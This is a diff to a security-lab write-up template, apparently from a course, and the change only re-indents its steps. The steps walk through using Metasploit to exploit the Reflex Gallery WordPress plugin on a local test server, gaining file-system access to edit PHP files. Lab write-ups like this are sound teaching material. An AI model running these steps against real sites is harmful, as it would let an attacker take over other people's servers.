@@ -13,17 +13,17 @@ Time spent: **X** hours spent in total
     - Fixed in version: 3.1.4 (Reflex Gallery)
   - [ ] GIF Walkthrough: <img src="arbitrary_file.gif">
   - Steps to recreate: 
-		1. '''Start service postgresql start'''
-		2. '''msfdb init'''
-		3. '''msfconsole'''
-		4. At this point, you will be inside of the Metasploit console
-		5. '''db_status (If it reads Connected to msf, you're good to go)'''
-		6. '''search Reflex'''
-		7. '''use 0'''
-		8. '''set RHOST 127.0.0.1'''
-		9. '''set RPORT 8080'''
-		10. '''set LHOST 192.168.65.3 (Different in some cases, it's eth0 under ifconfig)'''
-		11. '''exploit (this will gain you access to the file system to edit php files)'''
+	1. '''Start service postgresql start'''
+	2. '''msfdb init'''
+	3. '''msfconsole'''
+	4. At this point, you will be inside of the Metasploit console
+	5. '''db_status (If it reads Connected to msf, you're good to go)'''
+	6. '''search Reflex'''
+	7. '''use 0'''
+	8. '''set RHOST 127.0.0.1'''
+	9. '''set RPORT 8080'''
+	10. '''set LHOST 192.168.65.3 (Different in some cases, it's eth0 under ifconfig)'''
+	11. '''exploit (this will gain you access to the file system to edit php files)'''
 ### 2. (Required) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
